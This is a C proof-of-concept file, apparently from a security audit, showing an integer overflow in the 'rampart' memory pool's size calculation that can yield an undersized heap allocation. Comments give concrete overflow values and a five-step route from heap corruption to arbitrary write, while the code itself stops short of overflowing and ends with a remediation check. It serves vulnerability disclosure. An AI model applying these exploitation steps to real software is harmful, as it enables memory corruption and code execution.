/**
 * @file poc_02_integer_overflow.c
 * @brief PoC for VULN-002: Integer Overflow in Size Calculation
 *
 * VULNERABILITY: rp_block_calc_total_size() has no overflow check.
 *                Requesting allocation near SIZE_MAX causes wraparound.
 *
 * CVSS 3.1: 9.1 (Critical)
 * CWE-190: Integer Overflow or Wraparound
 *
 * IMPACT: Heap buffer overflow. Attacker can write beyond allocated bounds,
 *         corrupting adjacent memory and potentially achieving code execution.
 *
 * LOCATION: src/rp_block.c:364-376
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stddef.h>
#include "rampart.h"

/*
 * Block overhead calculation (from rp_types.h):
 * sizeof(rp_block_header_t) + RP_GUARD_SIZE + user_size + RP_GUARD_SIZE
 *
 * On 64-bit systems:
 * - rp_block_header_t: ~104 bytes (with padding)
 * - RP_GUARD_SIZE: 16 bytes
 * - Total overhead: ~136 bytes
 *
 * If user_size = SIZE_MAX - 100, the sum overflows to a small value.
 */

int main(void) {
    rampart_config_t config;
    rampart_pool_t *pool;
    void *ptr;
    size_t malicious_size;
    size_t i;

    printf("=== VULN-002: Integer Overflow in Size Calculation ===\n\n");

    /* Initialize pool */
    rampart_config_default(&config);
    config.pool_size = 1024 * 1024;  /* 1MB pool */
    config.validate_on_free = 0;     /* Disable to see full effect */

    pool = rampart_init(&config);
    if (pool == NULL) {
        printf("[!] Pool creation failed\n");
        return 1;
    }

    printf("[*] Pool created: %zu bytes\n", config.pool_size);

    /*
     * DEMONSTRATIVE: Show the math
     *
     * If we request SIZE_MAX - 64 bytes:
     * total = 104 + 16 + (SIZE_MAX - 64) + 16
     *       = 136 + SIZE_MAX - 64
     *       = SIZE_MAX + 72
     *       = 71 (after wraparound on 64-bit)
     *
     * After alignment: ~80 bytes
     */
    printf("\n[*] Demonstrating overflow calculation:\n");
    printf("    SIZE_MAX = %zu (0x%zx)\n", (size_t)-1, (size_t)-1);

    malicious_size = (size_t)-1 - 64;
    printf("    Requested size = SIZE_MAX - 64 = %zu\n", malicious_size);

    printf("\n[*] In rp_block_calc_total_size():\n");
    printf("    overhead = ~136 bytes\n");
    printf("    total = 136 + %zu = OVERFLOW!\n", malicious_size);
    printf("    Wrapped result = ~72 bytes\n");

    printf("\n[*] Attempting allocation with overflow size...\n");

    /*
     * The actual allocation will likely fail due to pool size check,
     * but the SIZE calculation itself is vulnerable.
     *
     * In a more sophisticated attack:
     * 1. Use a smaller overflow value that still fits the pool
     * 2. Get a tiny allocation
     * 3. Write "size" bytes, overflowing into adjacent blocks
     */

    ptr = rampart_alloc(pool, malicious_size);

    if (ptr == NULL) {
        printf("[*] Direct allocation failed (pool too small)\n");
        printf("    This is expected - pool check catches it.\n");
        printf("\n[!] HOWEVER: The size calculation itself overflowed!\n");
        printf("    A larger pool or different overflow value could succeed.\n");
    } else {
        printf("[VULNERABLE] Allocation succeeded!\n");
        printf("    Returned ptr: %p\n", ptr);
        printf("    User thinks they have %zu bytes\n", malicious_size);
        printf("    Actually allocated: ~72 bytes\n");
        printf("\n[CRITICAL] Any write beyond 72 bytes corrupts memory!\n");

        /* Don't actually overflow - just demonstrate */
        rampart_free(pool, ptr);
    }

    /*
     * DESTRUCTIVE VARIANT:
     * To actually exploit, find a size X where:
     * - overhead + X overflows to a small value V
     * - V < pool's largest free block
     * - Then write X bytes to cause heap corruption
     *
     * Example on 64-bit:
     * X = SIZE_MAX - 134 (overflows to 2)
     * After alignment: ~16 bytes allocated
     * Writing SIZE_MAX - 134 bytes = massive overflow
     */

    printf("\n=== Overflow Exploitation Theory ===\n");
    printf("Attack parameters for heap overflow:\n");
    printf("  1. Calculate X where overhead + X wraps to small value\n");
    printf("  2. Ensure wrapped value fits in pool\n");
    printf("  3. Write X bytes to allocated buffer\n");
    printf("  4. Adjacent block headers are corrupted\n");
    printf("  5. Next alloc/free achieves arbitrary write\n");

    rampart_shutdown(pool);

    printf("\n=== PoC Complete ===\n");

    /*
     * REMEDIATION:
     * Add overflow check in rp_block_calc_total_size():
     *
     * size_t overhead = sizeof(rp_block_header_t) + (RP_GUARD_SIZE * 2);
     * if (user_size > SIZE_MAX - overhead) {
     *     return 0;  // Signal overflow
     * }
     *
     * Then check for 0 return in rp_pool_alloc() and return error.
     */

    return 0;
}
